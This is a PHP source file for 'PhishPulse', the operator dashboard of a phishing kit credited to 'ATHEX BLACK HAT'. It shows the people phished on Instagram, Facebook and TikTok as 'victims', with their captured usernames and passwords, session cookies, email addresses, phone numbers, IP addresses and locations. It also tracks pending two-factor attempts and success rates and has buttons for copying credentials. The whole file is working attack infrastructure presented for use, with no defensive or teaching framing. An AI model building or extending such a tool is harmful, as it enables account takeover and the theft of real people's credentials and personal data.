<?php
/**
 * PhishPulse - Animated Dashboard
 * Version: 1.0
 * Author: ATHEX BLACK HAT
 * 
 * Single file dashboard with login + all sections
 */

// Include config
require_once 'config.php';

// Start session if not started
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Handle login
$login_error = '';
if (isset($_POST['login'])) {
    if (isset($_POST['password']) && $_POST['password'] === DEFAULT_PASSWORD) {
        $_SESSION['logged_in'] = true;
        $_SESSION['login_time'] = time();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = '❌ Invalid password!';
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// If not logged in, show login page
if (!isset($_SESSION['logged_in'])) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title><?php echo TOOL_NAME; ?> - Login</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                background: #0a0a0f;
                font-family: 'Segoe UI', sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                overflow: hidden;
            }
            
            /* Matrix rain background */
            .matrix-bg {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: 0;
                opacity: 0.1;
                background: repeating-linear-gradient(
                    0deg,
                    transparent,
                    transparent 2px,
                    rgba(0, 255, 136, 0.03) 2px,
                    rgba(0, 255, 136, 0.03) 4px
                );
            }
            
            .login-container {
                position: relative;
                z-index: 1;
                background: rgba(17, 17, 24, 0.95);
                border: 1px solid #2a2a3a;
                border-radius: 20px;
                padding: 40px;
                width: 400px;
                max-width: 90%;
                box-shadow: 0 0 50px rgba(0, 255, 136, 0.1);
                animation: fadeInUp 0.6s ease;
            }
            
            @keyframes fadeInUp {
                from {
                    opacity: 0;
                    transform: translateY(30px);
                }
                to {
                    opacity: 1;
                    transform: translateY(0);
                }
            }
            
            .login-logo {
                text-align: center;
                margin-bottom: 30px;
            }
            
            .login-icon {
                font-size: 60px;
                animation: pulse 2s infinite;
            }
            
            @keyframes pulse {
                0%, 100% { transform: scale(1); }
                50% { transform: scale(1.1); }
            }
            
            .login-title {
                color: #00ff88;
                font-size: 24px;
                font-weight: 700;
                margin-top: 10px;
                text-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
            }
            
            .login-subtitle {
                color: #606070;
                font-size: 12px;
                margin-top: 5px;
                letter-spacing: 2px;
                text-transform: uppercase;
            }
            
            .login-form {
                display: flex;
                flex-direction: column;
                gap: 15px;
            }
            
            .input-group {
                position: relative;
            }
            
            .input-icon {
                position: absolute;
                left: 15px;
                top: 50%;
                transform: translateY(-50%);
                font-size: 18px;
                z-index: 1;
            }
            
            .login-input {
                width: 100%;
                padding: 14px 15px 14px 45px;
                background: #1a1a25;
                border: 1px solid #2a2a3a;
                border-radius: 10px;
                color: #e0e0e0;
                font-size: 15px;
                outline: none;
                transition: all 0.3s ease;
            }
            
            .login-input:focus {
                border-color: #00ff88;
                box-shadow: 0 0 15px rgba(0, 255, 136, 0.2);
            }
            
            .login-input::placeholder {
                color: #404050;
            }
            
            .login-button {
                padding: 14px;
                background: linear-gradient(135deg, #00cc6a, #00ff88);
                color: #000;
                border: none;
                border-radius: 10px;
                font-size: 16px;
                font-weight: 700;
                cursor: pointer;
                transition: all 0.3s ease;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            
            .login-button:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 25px rgba(0, 255, 136, 0.4);
            }
            
            .login-error {
                background: rgba(255, 68, 68, 0.1);
                border: 1px solid rgba(255, 68, 68, 0.3);
                color: #ff4444;
                padding: 10px;
                border-radius: 8px;
                text-align: center;
                font-size: 14px;
                animation: shake 0.5s ease;
            }
            
            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                25% { transform: translateX(-10px); }
                75% { transform: translateX(10px); }
            }
            
            .login-footer {
                text-align: center;
                margin-top: 20px;
                color: #404050;
                font-size: 11px;
            }
            
            .login-footer span {
                color: #00ff88;
            }
            
            /* Glowing orbs */
            .orb {
                position: fixed;
                border-radius: 50%;
                filter: blur(80px);
                z-index: 0;
                animation: orbFloat 6s ease-in-out infinite;
            }
            
            .orb-1 {
                width: 300px;
                height: 300px;
                background: rgba(0, 255, 136, 0.08);
                top: -100px;
                left: -100px;
            }
            
            .orb-2 {
                width: 200px;
                height: 200px;
                background: rgba(0, 255, 136, 0.05);
                bottom: -50px;
                right: -50px;
                animation-delay: -3s;
            }
            
            @keyframes orbFloat {
                0%, 100% { transform: translate(0, 0); }
                50% { transform: translate(30px, -30px); }
            }
        </style>
    </head>
    <body>
        <div class="matrix-bg"></div>
        <div class="orb orb-1"></div>
        <div class="orb orb-2"></div>
        
        <div class="login-container">
            <div class="login-logo">
                <div class="login-icon">🔴</div>
                <div class="login-title"><?php echo TOOL_NAME; ?></div>
                <div class="login-subtitle">Advanced Dashboard v<?php echo DASHBOARD_VERSION; ?></div>
            </div>
            
            <form method="POST" class="login-form">
                <?php if ($login_error): ?>
                    <div class="login-error"><?php echo $login_error; ?></div>
                <?php endif; ?>
                
                <div class="input-group">
                    <span class="input-icon">🔒</span>
                    <input type="password" name="password" class="login-input" 
                           placeholder="Enter Dashboard Password" required autofocus>
                </div>
                
                <button type="submit" name="login" class="login-button">
                    ⚡ Access Dashboard
                </button>
            </form>
            
            <div class="login-footer">
                Protected by <span><?php echo TOOL_NAME; ?></span> | By <span><?php echo AUTHOR; ?></span>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ============================================
// LOGGED IN - SHOW MAIN DASHBOARD
// ============================================

// Include functions
require_once 'includes/functions.php';

// Get filter parameters
$current_filter = $_GET['filter'] ?? 'all';
$current_platform = $_GET['platform'] ?? 'all';
$current_search = $_GET['search'] ?? '';
$current_tab = $_GET['tab'] ?? 'victims';

// Get data for stats
$stats = get_stats();

// Include header
include 'includes/header.php';
?>

<!-- ============================================ -->
<!-- ASCII ART BANNER -->
<!-- ============================================ -->
<div class="ascii-banner">
    <pre>
   ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██████╗ ██╗   ██╗██╗     ███████╗███████╗
   ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔══██╗██║   ██║██║     ██╔════╝██╔════╝
   ██████╔╝███████║██║███████╗███████║██████╔╝██║   ██║██║     █████╗  █████╗  
   ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔═══╝ ██║   ██║██║     ██╔══╝  ██╔══╝  
   ██║     ██║  ██║██║███████║██║  ██║██║     ╚██████╔╝███████╗███████╗███████╗
   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚══════╝╚══════╝╚══════╝
   
              ██████╗  █████╗ ███████╗██╗  ██╗██████╗  ██████╗  █████╗ ██████╗ ██████╗ 
              ██╔══██╗██╔══██╗██╔════╝██║  ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██╔══██╗
              ██║  ██║███████║███████╗███████║██████╔╝██║   ██║███████║██████╔╝██║  ██║
              ██║  ██║██╔══██║╚════██║██╔══██║██╔══██╗██║   ██║██╔══██║██╔══██╗██║  ██║
              ██████╔╝██║  ██║███████║██║  ██║██████╔╝╚██████╔╝██║  ██║██║  ██║██████╔╝
              ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
    </pre>
</div>

<!-- ============================================ -->
<!-- STATS BAR -->
<!-- ============================================ -->
<div class="stats-bar">
    <div class="stat-card success" onclick="window.location='?filter=success'">
        <div class="stat-icon">✅</div>
        <div class="stat-value success" id="stat-success"><?php echo $stats['success_count']; ?></div>
        <div class="stat-label">Successful</div>
    </div>
    
    <div class="stat-card failed" onclick="window.location='?filter=failed'">
        <div class="stat-icon">❌</div>
        <div class="stat-value failed" id="stat-failed"><?php echo $stats['failed_count']; ?></div>
        <div class="stat-label">Failed</div>
    </div>
    
    <div class="stat-card pending" onclick="window.location='?filter=2fa_pending'">
        <div class="stat-icon">⏳</div>
        <div class="stat-value pending" id="stat-pending"><?php echo $stats['2fa_pending_count']; ?></div>
        <div class="stat-label">2FA Pending</div>
    </div>
    
    <div class="stat-card total">
        <div class="stat-icon">👥</div>
        <div class="stat-value total" id="stat-total"><?php echo $stats['total_victims']; ?></div>
        <div class="stat-label">Total Victims</div>
    </div>
    
    <div class="stat-card active">
        <div class="stat-icon">🟢</div>
        <div class="stat-value active" id="stat-active"><?php echo $stats['active_sessions']; ?></div>
        <div class="stat-label">Active Sessions</div>
    </div>
</div>

<!-- ============================================ -->
<!-- FILTERS BAR -->
<!-- ============================================ -->
<div class="filters-bar">
    <select id="filter-select" class="filter-select" onchange="window.location='?filter='+this.value+'&platform=<?php echo $current_platform; ?>&tab=<?php echo $current_tab; ?>'">
        <option value="all" <?php echo $current_filter === 'all' ? 'selected' : ''; ?>>📋 All Status</option>
        <option value="success" <?php echo $current_filter === 'success' ? 'selected' : ''; ?>>✅ Success</option>
        <option value="failed" <?php echo $current_filter === 'failed' ? 'selected' : ''; ?>>❌ Failed</option>
        <option value="2fa_pending" <?php echo $current_filter === '2fa_pending' ? 'selected' : ''; ?>>⏳ 2FA Pending</option>
    </select>
    
    <select id="platform-select" class="filter-select" onchange="window.location='?filter=<?php echo $current_filter; ?>&platform='+this.value+'&tab=<?php echo $current_tab; ?>'">
        <option value="all" <?php echo $current_platform === 'all' ? 'selected' : ''; ?>>📱 All Platforms</option>
        <option value="instagram" <?php echo $current_platform === 'instagram' ? 'selected' : ''; ?>>📸 Instagram</option>
        <option value="facebook" <?php echo $current_platform === 'facebook' ? 'selected' : ''; ?>>👤 Facebook</option>
        <option value="tiktok" <?php echo $current_platform === 'tiktok' ? 'selected' : ''; ?>>🎵 TikTok</option>
    </select>
    
    <input type="text" id="search-input" class="filter-input" 
           placeholder="🔍 Search username, email, country..." 
           value="<?php echo sanitize($current_search); ?>"
           onkeyup="debounceSearch(this.value)">
</div>

<!-- ============================================ -->
<!-- CONTENT AREA -->
<!-- ============================================ -->
<div class="content-area" id="victims-container">
    <?php
    // Get and filter victims
    $victims = read_json(VICTIMS_FILE);
    $victims = sort_by_timestamp($victims);
    
    if ($current_filter !== 'all') {
        $victims = filter_by_status($victims, $current_filter);
    }
    
    if ($current_platform !== 'all') {
        $victims = filter_by_platform($victims, $current_platform);
    }
    
    if ($current_search) {
        $victims = search_victims($current_search);
    }
    
    // Display victims
    if (empty($victims)):
    ?>
        <div class="empty-state">
            <div class="empty-icon">👻</div>
            <h3>No victims found</h3>
            <p>Waiting for incoming data...</p>
            <div class="waiting-dots">
                <div class="waiting-dot"></div>
                <div class="waiting-dot"></div>
                <div class="waiting-dot"></div>
            </div>
        </div>
    <?php else: ?>
        <?php foreach ($victims as $victim): 
            $platform_class = get_platform_class($victim['platform'] ?? '');
            $status_class = ($victim['status'] ?? '') === '2fa_pending' ? 'pending' : ($victim['status'] ?? 'success');
            $country = $victim['device']['country'] ?? 'Unknown';
            $time = time_ago($victim['timestamp'] ?? '');
        ?>
            <div class="victim-card <?php echo $status_class; ?>" id="victim-<?php echo $victim['id'] ?? 0; ?>">
                <div class="card-header" onclick="toggleCard(this)">
                    <div class="card-header-left">
                        <span class="platform-badge <?php echo $platform_class; ?>">
                            <?php echo get_platform_icon($victim['platform'] ?? ''); ?> 
                            <?php echo ucfirst($victim['platform'] ?? 'Unknown'); ?>
                        </span>
                        <?php echo get_status_badge($victim['status'] ?? ''); ?>
                        <span class="card-country"><?php echo get_country_flag($country); ?></span>
                        <span style="color: var(--text-secondary); font-size: 13px;"><?php echo sanitize($country); ?></span>
                    </div>
                    <span class="card-time">🕐 <?php echo $time; ?></span>
                </div>
                
                <div class="card-body">
                    <div class="data-grid">
                        <!-- Credentials -->
                        <div class="data-section">
                            <div class="data-section-title">🔑 Credentials</div>
                            <div class="data-row">
                                <span class="data-label">Username:</span>
                                <span class="data-value"><?php echo sanitize($victim['username'] ?? 'N/A'); ?></span>
                            </div>
                            <div class="data-row">
                                <span class="data-label">Password:</span>
                                <span class="data-value password"><?php echo sanitize($victim['password'] ?? 'N/A'); ?></span>
                            </div>
                            <?php if (isset($victim['attempt_number'])): ?>
                            <div class="data-row">
                                <span class="data-label">Attempt:</span>
                                <span class="data-value">#<?php echo $victim['attempt_number']; ?> of <?php echo $victim['total_attempts'] ?? 1; ?></span>
                            </div>
                            <?php endif; ?>
                        </div>
                        
                        <?php if (($victim['status'] ?? '') === 'success'): ?>
                        <!-- Cookies -->
                        <?php if (!empty($victim['cookies'])): ?>
                        <div class="data-section">
                            <div class="data-section-title">🍪 Cookies</div>
                            <?php 
                            $cookies = $victim['cookies'];
                            if (is_string($cookies)) {
                                $cookies = json_decode($cookies, true) ?? [$cookies];
                            }
                            foreach ($cookies as $key => $value):
                                if (is_string($key)):
                            ?>
                            <div class="data-row">
                                <span class="data-label"><?php echo sanitize($key); ?>:</span>
                                <span class="data-value cookie" title="<?php echo sanitize($value); ?>">
                                    <?php echo sanitize(truncate($value, 40)); ?>
                                </span>
                            </div>
                            <?php endif; endforeach; ?>
                        </div>
                        <?php endif; ?>
                        
                        <!-- Profile -->
                        <?php if (!empty($victim['profile'])): 
                            $profile = $victim['profile'];
                        ?>
                        <div class="data-section">
                            <div class="data-section-title">👤 Profile Info</div>
                            <?php if (!empty($profile['email'])): ?>
                            <div class="data-row">
                                <span class="data-label">📧 Email:</span>
                                <span class="data-value"><?php echo sanitize($profile['email']); ?></span>
                            </div>
                            <?php endif; ?>
                            <?php if (!empty($profile['phone'])): ?>
                            <div class="data-row">
                                <span class="data-label">📱 Phone:</span>
                                <span class="data-value"><?php echo sanitize($profile['phone']); ?></span>
                            </div>
                            <?php endif; ?>
                            <?php if (!empty($profile['full_name'])): ?>
                            <div class="data-row">
                                <span class="data-label">👤 Name:</span>
                                <span class="data-value"><?php echo sanitize($profile['full_name']); ?></span>
                            </div>
                            <?php endif; ?>
                            <?php if (!empty($profile['followers'])): ?>
                            <div class="data-row">
                                <span class="data-label">👥 Followers:</span>
                                <span class="data-value"><?php echo format_number($profile['followers']); ?></span>
                            </div>
                            <?php endif; ?>
                            <?php if (!empty($profile['following'])): ?>
                            <div class="data-row">
                                <span class="data-label">👣 Following:</span>
                                <span class="data-value"><?php echo format_number($profile['following']); ?></span>
                            </div>
                            <?php endif; ?>
                            <?php if (!empty($profile['is_verified'])): ?>
                            <div class="data-row">
                                <span class="data-label">✅ Verified:</span>
                                <span class="data-value" style="color: var(--accent-green);">Yes ✅</span>
                            </div>
                            <?php endif; ?>
                            <?php if (!empty($profile['bio'])): ?>
                            <div class="data-row">
                                <span class="data-label">📝 Bio:</span>
                                <span class="data-value"><?php echo sanitize(truncate($profile['bio'], 80)); ?></span>
                            </div>
                            <?php endif; ?>
                        </div>
                        <?php endif; ?>
                        <?php endif; ?>
                        
                        <!-- Device Info -->
                        <?php if (!empty($victim['device'])): 
                            $device = $victim['device'];
                        ?>
                        <div class="data-section">
                            <div class="data-section-title">🌍 Device Info</div>
                            <?php if (!empty($device['ip_address'])): ?>
                            <div class="data-row">
                                <span class="data-label">🌐 IP:</span>
                                <span class="data-value"><?php echo sanitize($device['ip_address']); ?></span>
                            </div>
                            <?php endif; ?>
                            <?php if (!empty($device['country'])): ?>
                            <div class="data-row">
                                <span class="data-label">🏳️ Country:</span>
                                <span class="data-value">
                                    <?php echo get_country_flag($device['country']); ?> 
                                    <?php echo sanitize($device['country']); ?>
                                </span>
                            </div>
                            <?php endif; ?>
                            <?php if (!empty($device['city'])): ?>
                            <div class="data-row">
                                <span class="data-label">🏙️ City:</span>
                                <span class="data-value"><?php echo sanitize($device['city']); ?></span>
                            </div>
                            <?php endif; ?>
                            <?php if (!empty($device['isp'])): ?>
                            <div class="data-row">
                                <span class="data-label">📡 ISP:</span>
                                <span class="data-value"><?php echo sanitize($device['isp']); ?></span>
                            </div>
                            <?php endif; ?>
                            <?php if (!empty($device['is_vpn'])): ?>
                            <div class="data-row">
                                <span class="data-label">🔒 VPN:</span>
                                <span class="data-value" style="color: var(--accent-yellow);">⚠️ Detected</span>
                            </div>
                            <?php endif; ?>
                        </div>
                        <?php endif; ?>
                    </div>
                    
                    <div class="card-actions">
                        <button class="btn btn-copy" onclick="copyAllData(this.closest('.victim-card'))">📋 Copy All</button>
                        <button class="btn btn-copy" onclick="copyToClipboard('<?php echo sanitize($victim['username'] ?? ''); ?>:<?php echo sanitize($victim['password'] ?? ''); ?>', this)">🔑 Copy Creds</button>
                        <button class="btn btn-danger" onclick="deleteVictim(<?php echo $victim['id'] ?? 0; ?>, this)">🗑️ Delete</button>
                    </div>
                </div>
            </div>
        <?php endforeach; ?>
    <?php endif; ?>
</div>

<!-- ============================================ -->
<!-- SESSIONS SECTION (Hidden by default) -->
<!-- ============================================ -->
<div class="content-area" id="sessions-container" style="display:none;">
    <?php
    $sessions = read_json(SESSIONS_FILE);
    $active_sessions = array_filter($sessions, function($s) {
        return in_array($s['status'] ?? '', ['active', '2fa_pending']);
    });
    
    if (empty($active_sessions)):
    ?>
        <div class="empty-state">
            <div class="empty-icon">👻</div>
            <h3>No active sessions</h3>
            <p>Waiting for victims to connect...</p>
        </div>
    <?php else: ?>
        <?php foreach ($active_sessions as $session): ?>
            <div class="session-card">
                <div class="session-header">
                    <div>
                        <span class="platform-badge <?php echo get_platform_class($session['platform'] ?? ''); ?>">
                            <?php echo get_platform_icon($session['platform'] ?? ''); ?>
                            <?php echo ucfirst($session['platform'] ?? 'Unknown'); ?>
                        </span>
                        <?php echo get_status_badge($session['status'] ?? 'active'); ?>
                    </div>
                    <span class="session-id">🆔 <?php echo substr($session['session_id'] ?? '', 0, 16); ?>...</span>
                </div>
                
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 8px; font-size: 12px; color: var(--text-secondary); margin-bottom: 10px;">
                    <span>🌍 <?php echo get_country_flag($session['country'] ?? 'Unknown'); ?> <?php echo sanitize($session['country'] ?? 'Unknown'); ?></span>
                    <span>🏙️ <?php echo sanitize($session['city'] ?? 'Unknown'); ?></span>
                    <span>🕐 Started: <?php echo time_ago($session['start_time'] ?? ''); ?></span>
                    <span>📝 Attempts: <?php echo $session['total_attempts'] ?? 0; ?></span>
                </div>
                
                <?php if (!empty($session['attempts'])): ?>
                <div class="attempt-list">
                    <?php foreach ($session['attempts'] as $i => $attempt): ?>
                    <div class="attempt-item">
                        <span class="attempt-number">#<?php echo $i + 1; ?></span>
                        <span><?php echo get_status_badge($attempt['status'] ?? ''); ?></span>
                        <span style="color: var(--text-muted);"><?php echo sanitize($attempt['username'] ?? 'N/A'); ?></span>
                        <span style="color: var(--text-muted); font-size: 11px;"><?php echo time_ago($attempt['timestamp'] ?? ''); ?></span>
                    </div>
                    <?php endforeach; ?>
                </div>
                <?php endif; ?>
                
                <div class="card-actions" style="margin-top: 10px;">
                    <button class="btn btn-danger" onclick="deleteSession('<?php echo $session['session_id']; ?>', this)">🗑️ Delete Session</button>
                </div>
            </div>
        <?php endforeach; ?>
    <?php endif; ?>
</div>

<!-- ============================================ -->
<!-- ANALYTICS SECTION (Hidden by default) -->
<!-- ============================================ -->
<div class="content-area" id="analytics-container" style="display:none;">
    <div class="analytics-grid">
        <div class="analytics-card">
            <div class="analytics-title">📊 Platform Distribution</div>
            <div class="bar-chart">
                <?php 
                $total = max($stats['total_victims'], 1);
                $platforms = [
                    ['name' => 'Instagram', 'count' => $stats['instagram_count'], 'class' => 'instagram'],
                    ['name' => 'Facebook', 'count' => $stats['facebook_count'], 'class' => 'facebook'],
                    ['name' => 'TikTok', 'count' => $stats['tiktok_count'], 'class' => 'tiktok'],
                ];
                foreach ($platforms as $p):
                    $pct = round(($p['count'] / $total) * 100);
                ?>
                <div class="bar-row">
                    <span class="bar-label"><?php echo $p['name']; ?></span>
                    <div class="bar-track">
                        <div class="bar-fill <?php echo $p['class']; ?>" style="width: <?php echo $pct; ?>%">
                            <?php echo $p['count']; ?>
                        </div>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
        </div>
        
        <div class="analytics-card">
            <div class="analytics-title">📈 Success Rate</div>
            <div class="bar-chart">
                <?php 
                $rate = get_success_rate($victims ?? []);
                $total_attempts = ($stats['success_count'] ?? 0) + ($stats['failed_count'] ?? 0);
                ?>
                <div class="bar-row">
                    <span class="bar-label">✅ Success</span>
                    <div class="bar-track">
                        <div class="bar-fill success" style="width: <?php echo $rate; ?>%"><?php echo $stats['success_count']; ?></div>
                    </div>
                </div>
                <div class="bar-row">
                    <span class="bar-label">❌ Failed</span>
                    <div class="bar-track">
                        <div class="bar-fill failed" style="width: <?php echo 100 - $rate; ?>%"><?php echo $stats['failed_count']; ?></div>
                    </div>
                </div>
            </div>
            <div style="text-align: center; margin-top: 15px; font-size: 24px; color: var(--accent-green);">
                <?php echo $rate; ?>% Success Rate
            </div>
        </div>
    </div>
    
    <?php $countries = get_unique_countries($victims ?? []); ?>
    <?php if (!empty($countries)): ?>
    <div class="analytics-card" style="margin-top: 15px;">
        <div class="analytics-title">🌍 Top Countries</div>
        <div class="bar-chart">
            <?php 
            $max_count = max($countries);
            $i = 0;
            foreach ($countries as $country => $count):
                if ($i++ >= 5) break;
                $pct = round(($count / $max_count) * 100);
            ?>
            <div class="bar-row">
                <span class="bar-label"><?php echo get_country_flag($country); ?> <?php echo $country; ?></span>
                <div class="bar-track">
                    <div class="bar-fill success" style="width: <?php echo $pct; ?>%"><?php echo $count; ?></div>
                </div>
            </div>
            <?php endforeach; ?>
        </div>
    </div>
    <?php endif; ?>
    
    <div class="analytics-card" style="margin-top: 15px;">
        <div class="analytics-title">📅 Today's Stats</div>
        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; text-align: center;">
            <div style="background: var(--bg-secondary); padding: 15px; border-radius: 8px;">
                <div style="font-size: 28px; color: var(--accent-green);"><?php echo $stats['today_count'] ?? 0; ?></div>
                <div style="font-size: 11px; color: var(--text-muted);">Today's Victims</div>
            </div>
            <div style="background: var(--bg-secondary); padding: 15px; border-radius: 8px;">
                <div style="font-size: 28px; color: var(--accent-cyan);"><?php echo $stats['active_sessions'] ?? 0; ?></div>
                <div style="font-size: 11px; color: var(--text-muted);">Active Sessions</div>
            </div>
        </div>
    </div>
</div>

<!-- ============================================ -->
<!-- SETTINGS SECTION (Hidden by default) -->
<!-- ============================================ -->
<div class="content-area" id="settings-container" style="display:none;">
    <div class="analytics-card">
        <div class="analytics-title">⚙️ Settings</div>
        
        <div style="display: grid; gap: 15px;">
            <div style="background: var(--bg-secondary); padding: 15px; border-radius: 8px;">
                <h4 style="margin-bottom: 10px;">🔒 Change Password</h4>
                <form method="POST" style="display: flex; gap: 10px; flex-wrap: wrap;">
                    <input type="password" name="new_password" placeholder="New Password" class="filter-input" style="flex: 1;">
                    <button type="submit" name="change_password" class="btn btn-copy">Update</button>
                </form>
            </div>
            
            <div style="background: var(--bg-secondary); padding: 15px; border-radius: 8px;">
                <h4 style="margin-bottom: 10px;">🗑️ Danger Zone</h4>
                <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 10px;">
                    This will permanently delete all victim data, sessions, and logs.
                </p>
                <button onclick="clearAllData()" class="btn btn-danger" style="background: rgba(255,68,68,0.2); color: var(--accent-red);">
                    ⚠️ Clear All Data
                </button>
            </div>
            
            <div style="background: var(--bg-secondary); padding: 15px; border-radius: 8px;">
                <h4 style="margin-bottom: 10px;">ℹ️ System Info</h4>
                <?php $sys = get_system_info(); ?>
                <div style="font-size: 12px; color: var(--text-muted); line-height: 1.8;">
                    <div>PHP Version: <?php echo $sys['php_version']; ?></div>
                    <div>Server: <?php echo $sys['server_software']; ?></div>
                    <div>OS: <?php echo $sys['os']; ?></div>
                    <div>Memory: <?php echo $sys['memory_usage']; ?></div>
                </div>
            </div>
        </div>
    </div>
</div>

<?php
// Include footer
include 'includes/footer.php';
?>